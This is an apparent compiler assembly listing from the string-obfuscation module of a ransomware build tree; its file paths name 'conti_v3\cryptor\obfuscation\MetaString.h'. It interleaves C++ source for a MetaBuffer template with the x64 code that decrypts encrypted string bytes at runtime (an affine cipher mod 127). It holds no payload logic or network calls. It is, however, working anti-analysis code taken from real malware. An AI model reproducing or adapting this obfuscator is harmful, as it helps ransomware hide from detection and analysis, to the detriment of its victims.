; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0f	 mov	 BYTE PTR [rcx+1], 15
  00007	c6 41 02 19	 mov	 BYTE PTR [rcx+2], 25
  0000b	c6 41 03 7c	 mov	 BYTE PTR [rcx+3], 124	; 0000007cH
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 3a	 mov	 BYTE PTR [rcx+5], 58	; 0000003aH
  00017	c6 41 06 7c	 mov	 BYTE PTR [rcx+6], 124	; 0000007cH
  0001b	c6 41 07 07	 mov	 BYTE PTR [rcx+7], 7
  0001f	c6 41 08 7e	 mov	 BYTE PTR [rcx+8], 126	; 0000007eH
  00023	c6 41 09 6a	 mov	 BYTE PTR [rcx+9], 106	; 0000006aH
  00027	c6 41 0a 6a	 mov	 BYTE PTR [rcx+10], 106	; 0000006aH
  0002b	c6 41 0b 7a	 mov	 BYTE PTR [rcx+11], 122	; 0000007aH
  0002f	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00033	48 8b c1	 mov	 rax, rcx
  00036	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0d 00 00
	00		 mov	 r11d, 13
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 39	 sub	 ecx, 57			; 00000039H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 33	 imul	 r8d, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 54	 mov	 BYTE PTR [rcx+1], 84	; 00000054H
  00007	c6 41 02 36	 mov	 BYTE PTR [rcx+2], 54	; 00000036H
  0000b	c6 41 03 77	 mov	 BYTE PTR [rcx+3], 119	; 00000077H
  0000f	c6 41 04 63	 mov	 BYTE PTR [rcx+4], 99	; 00000063H
  00013	c6 41 05 36	 mov	 BYTE PTR [rcx+5], 54	; 00000036H
  00017	c6 41 06 59	 mov	 BYTE PTR [rcx+6], 89	; 00000059H
  0001b	c6 41 07 3a	 mov	 BYTE PTR [rcx+7], 58	; 0000003aH
  0001f	c6 41 08 35	 mov	 BYTE PTR [rcx+8], 53	; 00000035H
  00023	c6 41 09 21	 mov	 BYTE PTR [rcx+9], 33	; 00000021H
  00027	c6 41 0a 31	 mov	 BYTE PTR [rcx+10], 49	; 00000031H
  0002b	c6 41 0b 59	 mov	 BYTE PTR [rcx+11], 89	; 00000059H
  0002f	c6 41 0c 59	 mov	 BYTE PTR [rcx+12], 89	; 00000059H
  00033	c6 41 0d 39	 mov	 BYTE PTR [rcx+13], 57	; 00000039H
  00037	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003b	48 8b c1	 mov	 rax, rcx
  0003e	c3		 ret	 0
??0?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 02	 sub	 eax, 2
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 02	 add	 r8d, 2
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 4d	 sub	 eax, 77			; 0000004dH
  00006	44 6b c0 33	 imul	 r8d, eax, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 85 4d
	00 00 00	 lea	 r8d, DWORD PTR [rax*4+77]
  0000b	44 03 c0	 add	 r8d, eax
  0000e	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00013	41 f7 e0	 mul	 r8d
  00016	41 8b c8	 mov	 ecx, r8d
  00019	2b ca		 sub	 ecx, edx
  0001b	d1 e9		 shr	 ecx, 1
  0001d	03 ca		 add	 ecx, edx
  0001f	c1 e9 06	 shr	 ecx, 6
  00022	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00025	44 2b c1	 sub	 r8d, ecx
  00028	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  0002c	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0c 00 00 00	 mov	 ecx, 12
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00013	41 c1 e0 03	 shl	 r8d, 3

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 25	 imul	 r8d, eax, 37		; 00000025H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0c	 add	 r8d, 12
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 11	 sub	 eax, 17
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	ff c0		 inc	 eax
  00005	44 6b c0 11	 imul	 r8d, eax, 17
  00009	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000e	41 f7 e0	 mul	 r8d
  00011	41 8b c8	 mov	 ecx, r8d
  00014	2b ca		 sub	 ecx, edx
  00016	d1 e9		 shr	 ecx, 1
  00018	03 ca		 add	 ecx, edx
  0001a	c1 e9 06	 shr	 ecx, 6
  0001d	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00020	44 2b c1	 sub	 r8d, ecx
  00023	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00027	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
